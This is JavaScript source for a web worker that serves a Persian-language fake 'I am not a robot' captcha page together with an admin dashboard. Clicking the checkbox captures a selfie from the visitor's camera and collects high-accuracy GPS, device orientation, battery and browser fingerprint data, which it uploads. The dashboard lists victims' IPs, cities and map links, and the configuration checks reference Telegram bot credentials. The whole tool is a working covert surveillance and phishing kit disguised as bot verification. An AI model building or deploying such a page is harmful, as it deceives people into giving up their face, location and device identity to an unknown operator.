  .mt { margin-top: 16px; }
  .mt-sm { margin-top: 8px; }
`;

// ============================================================
//  Admin: Login page
// ============================================================
function renderAdminLogin(nonce, adminBase, params) {
  const err = params.get('err');
  const errMsg =
    err === 'rate'
      ? '⛔️ تعداد تلاش بیش از حد مجاز. یک دقیقه صبر کنید.'
      : err === 'invalid'
        ? '⛔️ رمز عبور اشتباه است.'
        : null;

  return `<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex,nofollow,noarchive">
<title>ورود به پنل</title>
<style nonce="${nonce}">${ADMIN_CSS}</style>
</head>
<body>
  <div class="wrap" style="max-width:380px">
    <form class="card login-card" method="POST" action="${adminBase}/login">
      <div class="login-icon">🔐</div>
      <h1>پنل مدیریت</h1>
      <p class="subtitle">برای ادامه رمز عبور را وارد کنید</p>
      ${errMsg ? `<div class="alert err">${errMsg}</div>` : ''}
      <input type="password" name="password" placeholder="رمز عبور"
             required autofocus autocomplete="current-password">
      <button type="submit" class="btn btn-primary btn-block mt">ورود</button>
    </form>
  </div>
</body>
</html>`;
}

// ============================================================
//  Admin: Feature card helper
// ============================================================
function featureCard(opts) {
  const { icon, title, active, hint, feature, onLabel, offLabel } = opts;
  return `
  <div class="feature-card ${active ? 'active' : 'inactive'}">
    <div class="feature-head">
      <span class="feature-icon">${icon}</span>
      <span class="feature-title">${title}</span>
      <span class="feature-status ${active ? 'on' : 'off'}">${active ? 'روشن' : 'خاموش'}</span>
    </div>
    <div class="feature-hint">${hint}</div>
    <form method="POST" action="${opts.adminBase}/toggle" data-confirm="آیا مطمئنید؟">
      <input type="hidden" name="feature" value="${feature}">
      <input type="hidden" name="state" value="${active ? 'off' : 'on'}">
      <button type="submit" class="btn btn-block ${active ? 'btn-danger' : 'btn-success'}">
        ${active ? offLabel : onLabel}
      </button>
    </form>
  </div>`;
}

// ============================================================
//  Admin: Dashboard
// ============================================================
function renderAdminDashboard(nonce, adminBase, selfieState, geoState, env, cf, log, params) {
  const selfieOn = selfieState === 'on';
  const geoOn = geoState === 'on';
  const storage = env.SELFIE_STATE ? 'KV' : 'Cache (per-colo)';
  const now = new Date();
  const timeStr = now.toISOString().replace('T', ' ').slice(0, 19) + ' UTC';

  const okP = params.get('ok');
  const errP = params.get('err');
  let toast = '';
  if (okP === 'login') toast = `<div class="alert ok">✅ ورود موفق.</div>`;
  else if (okP === 'toggled') {
    const f = params.get('feature');
    const s = params.get('state');
    const label = f === 'geo' ? 'موقعیت' : 'سلفی';
    toast = `<div class="alert ok">✅ ${label} به «${
      s === 'on' ? 'روشن' : 'خاموش'
    }» تغییر کرد.</div>`;
  } else if (errP === 'state') toast = `<div class="alert err">❌ درخواست نامعتبر.</div>`;

  const rows = (log || []).length
    ? log
        .map((e) => {
          const coords =
            e.lat != null && e.lon != null
              ? `<a class="map-link" href="${escapeHtml(
                  `https://www.google.com/maps/search/?api=1&query=${e.lat},${e.lon}`
                )}" target="_blank" rel="noopener">${e.lat.toFixed(
                  3
                )}, ${e.lon.toFixed(3)}</a>`
              : '<span style="color:var(--muted)">—</span>';
          return `
          <tr>
            <td><code>${new Date(e.ts || 0).toISOString().slice(11, 19)}</code></td>
            <td><code>${escapeHtml(e.ip || '—')}</code></td>
            <td>${escapeHtml(e.city || '—')}${e.country ? '، ' + escapeHtml(e.country) : ''}</td>
            <td>${e.selfieMode === 'on' ? '🟢' : '🔴'}</td>
            <td>${coords}</td>
          </tr>`;
        })
        .join('')
    : '<tr><td colspan="5" class="empty">هیچ ارسالی ثبت نشده</td></tr>';

  const checks = [
    { label: 'TELEGRAM_BOT_TOKEN', ok: !!env.TELEGRAM_BOT_TOKEN },
    { label: 'TELEGRAM_CHAT_ID', ok: !!env.TELEGRAM_CHAT_ID },
    { label: 'ADMIN_TOKEN', ok: !!env.ADMIN_TOKEN },
    {
      label: 'ADMIN_PASSWORD',
      ok: !!env.ADMIN_PASSWORD,
      warn: !env.ADMIN_PASSWORD,
    },
    {
      label: 'KV (SELFIE_STATE)',
      ok: !!env.SELFIE_STATE,
      warn: !env.SELFIE_STATE,
    },
    { label: 'SESSION_SECRET', ok: !!env.SESSION_SECRET, optional: true },
  ];

  const checksHtml = checks
    .map((c) => {
      const icon = c.ok ? '✅' : c.warn ? '⚠️' : c.optional ? '➖' : '❌';
      const cls = c.ok ? 'ok' : c.warn ? 'warn' : c.optional ? '' : 'miss';
      return `<div class="ck"><span class="ck-icon ${cls}">${icon}</span><span>${c.label}</span></div>`;
    })
    .join('');

  return `<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex,nofollow,noarchive">
<title>پنل مدیریت</title>
<style nonce="${nonce}">${ADMIN_CSS}</style>
</head>
<body>
  <div class="wrap">
    <div class="card">
      <div class="row-between">
        <div>
          <h1>🔐 پنل مدیریت</h1>
          <p class="subtitle" style="margin:4px 0 0">${escapeHtml(adminBase)}</p>
        </div>
        <form method="POST" action="${adminBase}/logout">
          <button type="submit" class="btn btn-sm">خروج</button>
        </form>
      </div>

      ${toast}

      <div class="toolbar">
        <a class="btn btn-sm" href="/" target="_blank" rel="noopener">↗️ صفحهٔ کپچا</a>
        <a class="btn btn-sm" href="${adminBase}">🔄 بروزرسانی</a>
      </div>

      <div class="features-grid">
        ${featureCard({
          icon: '📸',
          title: 'سلفی',
          active: selfieOn,
          hint: selfieOn
            ? 'از کاربر دوربین درخواست می‌شود و تصویر ارسال می‌گردد'
            : 'دوربین درخواست نمی‌شود — سایر داده‌ها همچنان ارسال می‌شوند',
          feature: 'selfie',
          onLabel: '🟢 روشن کردن سلفی',
          offLabel: '🔴 خاموش کردن سلفی',
          adminBase,
        })}
        ${featureCard({
          icon: '📍',
          title: 'موقعیت دقیق',
          active: geoOn,
          hint: geoOn
            ? 'از کاربر اجازهٔ موقعیت مکانی خواسته می‌شود (GPS با دقت بالا)'
            : 'موقعیت درخواست نمی‌شود — فقط مختصات IP از Cloudflare ثبت می‌شود',
          feature: 'geo',
          onLabel: '🟢 روشن کردن موقعیت',
          offLabel: '🔴 خاموش کردن موقعیت',
          adminBase,
        })}
      </div>

      <div class="info-grid">
        <div class="info-item">
          <span class="info-label">ذخیره‌سازی</span>
          <span class="info-value">${escapeHtml(storage)}</span>
        </div>
        <div class="info-item">
          <span class="info-label">Colo</span>
          <span class="info-value">${escapeHtml(cf.colo || '—')}</span>
        </div>
        <div class="info-item">
          <span class="info-label">زمان سرور</span>
          <span class="info-value small">${escapeHtml(timeStr)}</span>
        </div>
      </div>

      <section>
        <h2>📋 آخرین ارسال‌ها</h2>
        <div class="table-wrap">
          <table>
            <thead>
              <tr>
                <th>زمان</th>
                <th>IP</th>
                <th>شهر، کشور</th>
                <th>سلفی</th>
                <th>موقعیت</th>
              </tr>
            </thead>
            <tbody>${rows}</tbody>
          </table>
        </div>
      </section>

      <section class="mt">
        <h2>🛠 سلامت تنظیمات</h2>
        <div class="checks">${checksHtml}</div>
      </section>
    </div>
  </div>

<script nonce="${nonce}">
  document.querySelectorAll('form[data-confirm]').forEach((f) => {
    f.addEventListener('submit', (e) => {
      if (!confirm(f.dataset.confirm)) e.preventDefault();
    });
  });
</script>
</body>
</html>`;
}

// ============================================================
//  Frontend (captcha page)
// ============================================================
function renderHTML(nonce, selfieState, geoState) {
  const selfieMode = selfieState === 'off' ? 'off' : 'on';
  const geoMode = geoState === 'on' ? 'on' : 'off';
  const hintText =
    selfieMode === 'on'
      ? 'با کلیک روی این کادر، یک تصویر سلفی و اطلاعات فنی مرورگر شما برای بررسی ارسال می‌شود.' +
        (geoMode === 'on' ? ' همچنین ممکن است اجازهٔ دسترسی به موقعیت مکانی خواسته شود.' : '')
      : 'با کلیک روی این کادر، اطلاعات فنی مرورگر شما برای بررسی ارسال می‌شود.' +
        (geoMode === 'on' ? ' همچنین ممکن است اجازهٔ دسترسی به موقعیت مکانی خواسته شود.' : '');

  return `<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex,nofollow,noarchive">
<title>تایید هویت</title>
<style nonce="${nonce}">
  :root { --accent:#4a90e2; --ok:#22a06b; --err:#d93636; --muted:#6b7280; --border:#dcdfe4; }
  * { box-sizing: border-box; }
  html, body { margin: 0; height: 100%; }
  body {
    display: flex; align-items: center; justify-content: center;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
    background: #f5f6f8; color: #1f2328; padding: 16px;
  }
  .card {
    width: 100%; max-width: 360px;
    background: #fff; border: 1px solid var(--border); border-radius: 12px;
    box-shadow: 0 6px 24px rgba(15,23,42,.06);
    padding: 20px;
  }
  .row { display: flex; align-items: center; gap: 14px; }
  .checkbox {
    width: 28px; height: 28px; border: 2px solid #9ca3af; border-radius: 6px;
    display: flex; align-items: center; justify-content: center;
    cursor: pointer; background: #fff; transition: all .18s ease; flex-shrink: 0;
  }
  .checkbox:hover { border-color: var(--accent); }
  .checkbox:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
  .checkbox.checked { background: var(--accent); border-color: var(--accent); }
  .checkbox.checked::after {
    content: ""; width: 7px; height: 13px;
    border: solid #fff; border-width: 0 2.5px 2.5px 0;
    transform: rotate(45deg); margin-bottom: 3px;
  }
  .checkbox.busy { border-color: var(--accent); }
  .checkbox.busy::after {
    content: ""; width: 14px; height: 14px;
    border: 2px solid #e5e7eb; border-top-color: var(--accent);
    border-radius: 50%; animation: spin .7s linear infinite;
  }
  .checkbox.checked.busy::after { animation: none; }
  @keyframes spin { to { transform: rotate(360deg); } }
  .label { font-size: 16px; font-weight: 500; cursor: pointer; }
  .hint { margin-top: 14px; font-size: 12px; color: var(--muted); line-height: 1.7; }
  .status { margin-top: 12px; font-size: 13px; min-height: 18px; }
  .status.error { color: var(--err); }
  .status.ok { color: var(--ok); }
  .retry {
    margin-top: 8px; background: none; border: 1px solid var(--border);
    color: #1f2328; padding: 6px 12px; border-radius: 8px; font-size: 13px;
    cursor: pointer; display: none;
  }
  .retry:hover { background: #f3f4f6; }
  #hiddenVideo, #canvas { display: none; }
  noscript { display: block; margin-top: 12px; color: var(--err); font-size: 13px; }
</style>
</head>
<body>
  <div class="card">
    <div class="row">
      <div class="checkbox" id="checkbox" role="checkbox" aria-checked="false" aria-label="من ربات نیستم" tabindex="0"></div>
      <span class="label" id="label">من ربات نیستم</span>
    </div>
    <p class="hint">
      ${hintText}
    </p>
    <div class="status" id="status" role="status" aria-live="polite"></div>
    <button class="retry" id="retry" type="button">تلاش مجدد</button>
    <noscript>برای ادامه، جاوااسکریپت باید فعال باشد.</noscript>
  </div>

  <video id="hiddenVideo" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas>

<script nonce="${nonce}">
(() => {
  const SELFIE_MODE = ${JSON.stringify(selfieMode)};
  const GEO_MODE = ${JSON.stringify(geoMode)};

  const el = {
    box: document.getElementById('checkbox'),
    label: document.getElementById('label'),
    status: document.getElementById('status'),
    retry: document.getElementById('retry'),
    video: document.getElementById('hiddenVideo'),
    canvas: document.getElementById('canvas'),
  };
  let busy = false;

  const CAM_ERRORS = {
    NotAllowedError: 'دسترسی به دوربین رد شد. اجازه دهید و دوباره تلاش کنید.',
    NotFoundError: 'دوربینی یافت نشد.',
    NotReadableError: 'دوربین در حال استفاده توسط برنامه دیگری است.',
    OverconstrainedError: 'دوربین با تنظیمات درخواستی سازگار نیست.',
    SecurityError: 'دسترسی به دوربین به دلایل امنیتی ممکن نیست (HTTPS الزامی است).',
    AbortError: 'دسترسی به دوربین لغو شد.',
  };

  function setState(state, message) {
    el.box.classList.remove('busy', 'checked');
    el.box.setAttribute('aria-checked', 'false');
    el.status.className = 'status';
    el.status.textContent = message || '';
    el.retry.style.display = 'none';
    if (state === 'busy') {
      el.box.classList.add('busy');
      el.label.textContent = 'در حال بررسی...';
      el.status.textContent = message || 'در حال بررسی...';
    } else if (state === 'done') {
      el.box.classList.add('checked');
      el.box.setAttribute('aria-checked', 'true');
      el.label.textContent = 'تایید شد';
      el.status.classList.add('ok');
      el.status.textContent = 'اطلاعات با موفقیت ارسال شد.';
    } else if (state === 'error') {
      el.label.textContent = 'من ربات نیستم';
      el.status.classList.add('error');
      el.status.textContent = message || 'خطایی رخ داد.';
      el.retry.style.display = 'inline-block';
    } else {
      el.label.textContent = 'من ربات نیستم';
    }
  }

  async function getCameraStream() {
    const primary = { video: { facingMode: 'user' }, audio: false };
    try {
      return await navigator.mediaDevices.getUserMedia(primary);
    } catch (e) {
      if (e.name === 'OverconstrainedError' || e.name === 'NotFoundError') {
        return await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
      }
      throw e;
    }
  }

  function waitForVideo(video, timeoutMs = 6000) {
    if (video.readyState >= 2) return Promise.resolve();
    return new Promise((resolve, reject) => {
      const to = setTimeout(() => reject(new Error('camera_timeout')), timeoutMs);
      video.onloadeddata = () => { clearTimeout(to); resolve(); };
    });
  }

  async function collectCameraInfo(stream) {
    const info = {};
    const track = stream.getVideoTracks()[0];
    if (!track) return info;
    try {
      const s = track.getSettings?.() || {};
      const c = track.getCapabilities?.() || {};
      info.deviceId = s.deviceId;
      info.groupId = s.groupId;
      info.facingMode = s.facingMode;
      info.width = s.width;
      info.height = s.height;
      info.frameRate = s.frameRate;
      info.aspectRatio = s.aspectRatio;
      info.resizeMode = s.resizeMode;
      info.focusMode = s.focusMode;
      info.exposureMode = s.exposureMode;
      info.whiteBalanceMode = s.whiteBalanceMode;
      info.supportedFacingModes = c.facingMode || [];
      info.supportedFocusModes = c.focusMode || [];
      info.hasTorch = !!c.torch;
      info.zoom = c.zoom ? { min: c.zoom.min, max: c.zoom.max, step: c.zoom.step } : null;
      info.iso = c.iso ? { min: c.iso.min, max: c.iso.max, step: c.iso.step } : null;
      info.focusDistance = c.focusDistance
        ? { min: c.focusDistance.min, max: c.focusDistance.max }
        : null;
      info.brightness = c.brightness ? { min: c.brightness.min, max: c.brightness.max } : null;
      info.contrast = c.contrast ? { min: c.contrast.min, max: c.contrast.max } : null;
      info.saturation = c.saturation ? { min: c.saturation.min, max: c.saturation.max } : null;
      info.sharpness = c.sharpness ? { min: c.sharpness.min, max: c.sharpness.max } : null;
      info.requestedConstraints = track.getConstraints?.() || null;
    } catch (e) {
      info._settingsError = String(e);
    }
    try {
      const devices = await navigator.mediaDevices.enumerateDevices();
      info.videoDeviceCount = devices.filter((d) => d.kind === 'videoinput').length;
      info.audioDeviceCount = devices.filter((d) => d.kind === 'audioinput').length;
      info.videoDeviceLabels = devices
        .filter((d) => d.kind === 'videoinput')
        .map((d) => d.label || '(unnamed)');
    } catch (e) {
      info._enumerateError = String(e);
    }
    return info;
  }

  async function requestOrientationPermission() {
    try {
      if (typeof DeviceOrientationEvent === 'undefined') {
        return { available: false, reason: 'unsupported' };
      }
      if (typeof DeviceOrientationEvent.requestPermission === 'function') {
        const state = await DeviceOrientationEvent.requestPermission();
        return { available: state === 'granted', reason: state };
      }
      return { available: true, reason: 'no_permission_needed' };
    } catch (e) {
      return { available: false, reason: String((e && e.message) || e) };
    }
  }

  async function collectOrientation(sampleMs = 500) {
    const result = {
      supported: typeof DeviceOrientationEvent !== 'undefined',
      samples: [],
    };
    try {
      if (screen.orientation) {
        result.screenOrientation = {
          type: screen.orientation.type,
          angle: screen.orientation.angle,
        };
      } else if (typeof window.orientation !== 'undefined') {
        result.screenOrientation = { angle: window.orientation };
      }
    } catch (e) {
      result._screenOrientationError = String(e);
    }
    if (!result.supported) return result;

    const collected = [];
    const listener = (ev) => {
      collected.push({
        alpha: typeof ev.alpha === 'number' ? ev.alpha : null,
        beta: typeof ev.beta === 'number' ? ev.beta : null,
        gamma: typeof ev.gamma === 'number' ? ev.gamma : null,
        absolute: ev.absolute === true,
      });
    };
    window.addEventListener('deviceorientation', listener);
    await new Promise((r) => setTimeout(r, sampleMs));
    window.removeEventListener('deviceorientation', listener);

    const valid = collected.filter(
      (s) => s.alpha != null || s.beta != null || s.gamma != null
    );
    if (valid.length === 0) {
      result.note = 'no_events_received';
      return result;
    }
    const avgOf = (key) => {
      const v = valid.map((s) => s[key]).filter((n) => typeof n === 'number');
      return v.length ? v.reduce((a, b) => a + b, 0) / v.length : null;
    };
    result.average = {
      alpha: avgOf('alpha'),
      beta: avgOf('beta'),
      gamma: avgOf('gamma'),
    };
    result.sampleCount = valid.length;
    result.absolute = valid.some((s) => s.absolute);
    result.posture = classifyPosture(result.average, result.screenOrientation);
    return result;
  }

  function classifyPosture(avg, screenOrient) {
    if (avg.beta == null && avg.gamma == null) return 'unknown';
    const beta = avg.beta ?? 0;
    const gamma = avg.gamma ?? 0;
    const absB = Math.abs(beta);
    const parts = [];

    if (absB < 20) parts.push('افقی (تخت)');
    else if (absB < 70) parts.push(beta > 0 ? 'کمی رو به جلو' : 'کمی رو به عقب');
    else if (absB < 110) parts.push('عمودی');
    else parts.push('رو به پایین');

    if (gamma > 25) parts.push('کج به راست');
    else if (gamma < -25) parts.push('کج به چپ');

    const t = screenOrient && screenOrient.type;
    if (t) {
      if (t.indexOf('portrait') === 0) parts.push('صفحه عمودی');
      else if (t.indexOf('landscape') === 0) parts.push('صفحه افقی');
    }
    return parts.join(' • ') || 'صاف';
  }

  async function collectBattery() {
    const out = { supported: typeof navigator.getBattery === 'function' };
    if (!out.supported) {
      out.reason = 'api_unsupported';
      return out;
    }
    try {
      const b = await navigator.getBattery();
      out.level = b.level;
      out.percent = Math.round(b.level * 100);
      out.charging = !!b.charging;
      out.chargingTime = Number.isFinite(b.chargingTime) ? b.chargingTime : null;
      out.dischargingTime = Number.isFinite(b.dischargingTime) ? b.dischargingTime : null;
    } catch (e) {
      out.error = String((e && e.message) || e);
    }
    return out;
  }

  // 🔽 NEW: Geolocation with high accuracy
  async function collectGeolocation() {
    if (!('geolocation' in navigator)) {
      return { supported: false, reason: 'api_unsupported' };
    }

    return new Promise((resolve) => {
      let done = false;
      const finish = (result) => {
        if (done) return;
        done = true;
        resolve(result);
      };

      // Outer safety net
      const safety = setTimeout(() => {
        finish({
          supported: true,
          success: false,
          error: 'OUTER_TIMEOUT',
          message: 'درخواست موقعیت در زمان مقرر پاسخ نگرفت',
        });
      }, 14000);

      try {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            clearTimeout(safety);
            const c = pos.coords;
            finish({
              supported: true,
              success: true,
              latitude: c.latitude,
              longitude: c.longitude,
              accuracy: c.accuracy,
              altitude: typeof c.altitude === 'number' ? c.altitude : null,
              altitudeAccuracy:
                typeof c.altitudeAccuracy === 'number' ? c.altitudeAccuracy : null,
              heading: typeof c.heading === 'number' ? c.heading : null,
              speed: typeof c.speed === 'number' ? c.speed : null,
              timestamp: pos.timestamp,
            });
          },
          (err) => {
            clearTimeout(safety);
            const errNames = {
              1: 'PERMISSION_DENIED',
              2: 'POSITION_UNAVAILABLE',
              3: 'TIMEOUT',
            };
            finish({
              supported: true,
              success: false,
              error: errNames[err.code] || 'CODE_' + err.code,
              message: String(err.message || ''),
            });
          },
          {
            enableHighAccuracy: true,
            maximumAge: 0,
            timeout: 10000,
          }
        );
      } catch (e) {
        clearTimeout(safety);
        finish({
          supported: true,
          success: false,
          error: 'THROW',
          message: String((e && e.message) || e),
        });
      }
    });
  }

  function collectClientData() {
    const c = navigator.connection || {};
    const now = new Date();
    return {
      userAgent: navigator.userAgent,
      language: navigator.language,
      languages: navigator.languages ? Array.from(navigator.languages) : [],
      platform: navigator.platform,
      screenWidth: window.screen.width,
      screenHeight: window.screen.height,
      innerWidth: window.innerWidth,
      innerHeight: window.innerHeight,
      devicePixelRatio: window.devicePixelRatio,
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: navigator.deviceMemory,
      onLine: navigator.onLine,
      connectionType: c.effectiveType || null,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      localTime: now.toLocaleString(),
      utcTime: now.toISOString(),
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      pdfViewerEnabled: navigator.pdfViewerEnabled,
    };
  }

  async function run() {
    if (busy) return;
    busy = true;
    setState('busy');

    // Orientation permission needs user gesture — call early
    const orientationPerm = await requestOrientationPermission();

    let stream = null;
    try {
      let blob = null;
      let captured = null;
      let camInfo = {};

      if (SELFIE_MODE === 'on') {
        stream = await getCameraStream();
        el.video.srcObject = stream;
        await waitForVideo(el.video);
        await new Promise((r) => setTimeout(r, 350));

        camInfo = await collectCameraInfo(stream);

        el.canvas.width = el.video.videoWidth || 640;
        el.canvas.height = el.video.videoHeight || 480;
        el.canvas.getContext('2d').drawImage(el.video, 0, 0, el.canvas.width, el.canvas.height);

        blob = await new Promise((res) => el.canvas.toBlob(res, 'image/jpeg', 0.9));
        if (!blob) throw new Error('capture_failed');

        captured = {
          width: el.canvas.width,
          height: el.canvas.height,
          size: blob.size,
        };

        stream.getTracks().forEach((t) => t.stop());
        stream = null;
      }

      // Gather orientation, battery, geolocation in parallel
      const [orientation, battery, geolocation] = await Promise.all([
        orientationPerm.available
          ? collectOrientation()
          : Promise.resolve({ supported: false, reason: orientationPerm.reason }),
        collectBattery(),
        GEO_MODE === 'on'
          ? collectGeolocation()
          : Promise.resolve({ supported: true, skipped: true, note: 'disabled_by_admin' }),
      ]);

      const clientData = collectClientData();
      clientData.selfieMode = SELFIE_MODE;
      clientData.geoMode = GEO_MODE;
      clientData.camera = camInfo;
      clientData.capturedFrame = captured;
      clientData.orientation = orientation;
      clientData.orientationPermission = orientationPerm;
      clientData.battery = battery;
      clientData.geolocation = geolocation;

      const fd = new FormData();
      if (SELFIE_MODE === 'on' && blob) {
        fd.append('photo', blob, 'selfie.jpg');
      }
      fd.append('clientData', JSON.stringify(clientData));

      const resp = await fetch('/upload', {
        method: 'POST',
        body: fd,
        credentials: 'same-origin',
      });
      if (!resp.ok) {
        let detail = '';
        try { detail = (await resp.json()).error || ''; } catch {}
        throw new Error('upload_failed:' + (detail || resp.status));
      }

      setState('done');
    } catch (err) {
      if (stream) stream.getTracks().forEach((t) => t.stop());
      const name = err && err.name;
      const msg =
        CAM_ERRORS[name] ||
        (err && err.message === 'camera_timeout'
          ? 'زمان انتظار برای دوربین به پایان رسید.'
          : err && err.message && err.message.indexOf('upload_failed') === 0
          ? 'ارسال اطلاعات ناموفق بود. لطفاً دوباره تلاش کنید.'
          : 'خطایی رخ داد. لطفاً دوباره تلاش کنید.');
      setState('error', msg);
    } finally {
      busy = false;
    }
  }

  el.box.addEventListener('click', run);
  el.label.addEventListener('click', run);
  el.retry.addEventListener('click', run);
  el.box.addEventListener('keydown', (e) => {
    if (e.key === ' ' || e.key === 'Enter') { e.preventDefault(); run(); }
  });
})();
</script>
</body>
</html>`;
}